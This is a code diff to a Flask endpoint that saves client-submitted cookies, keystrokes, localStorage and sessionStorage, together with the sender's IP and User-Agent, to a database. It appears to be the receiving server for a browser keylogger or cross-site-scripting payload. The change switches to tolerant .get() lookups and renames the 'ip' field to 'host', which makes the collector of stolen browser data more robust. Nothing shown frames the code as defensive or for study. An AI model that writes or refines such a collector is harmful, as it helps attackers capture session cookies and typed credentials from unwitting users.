@@ -32,12 +32,12 @@ def logging_post():
     req_data = json.loads(request.data)
     try:
         log = Log(
-            cookies=req_data["cookies"],
-            ip=request.remote_addr,
-            keystrokes=req_data["keystrokes"],
-            local_storage=req_data["localStorage"],
-            session_storage=req_data["sessionStorage"],
-            user_agent=request.headers.get('User-Agent'),
+            cookies=req_data.get("cookies", ""),
+            host=request.remote_addr,
+            keystrokes=req_data.get("keystrokes", ""),
+            local_storage=req_data.get("localStorage", ""),
+            session_storage=req_data.get("sessionStorage", ""),
+            user_agent=request.headers.get("User-Agent"),
         )
         db.session.add(log)
         db.session.commit()
